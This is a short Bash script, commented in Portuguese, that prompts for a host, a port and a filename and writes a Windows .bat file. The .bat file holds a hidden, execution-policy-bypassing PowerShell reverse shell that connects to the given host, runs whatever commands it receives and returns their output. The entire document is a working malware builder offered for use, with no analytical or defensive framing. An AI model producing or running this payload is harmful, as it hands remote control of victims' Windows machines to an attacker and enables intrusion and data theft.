#!/bin/bash

# Solicita ao usuário o HOST, a PORTA e o NOME DO ARQUIVO
read -p "Digite o HOST: " host
read -p "Digite a PORTA: " port
read -p "Digite o nome do arquivo (com extensão .bat): " filename

# Verifica se o nome do arquivo termina com .bat
if [[ "$filename" != *.bat ]]; then
    filename="$filename.bat"
fi

# Conteúdo do script .bat de reverse shell
bat_script='@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('\'''"$host"''\'',"$port"');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + '\''PS '\'' + (pwd).Path + '\''> '\'';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
exit'

# Cria o arquivo .bat com o conteúdo do reverse shell
echo "$bat_script" > "$filename"

echo "Arquivo $filename criado com sucesso!"
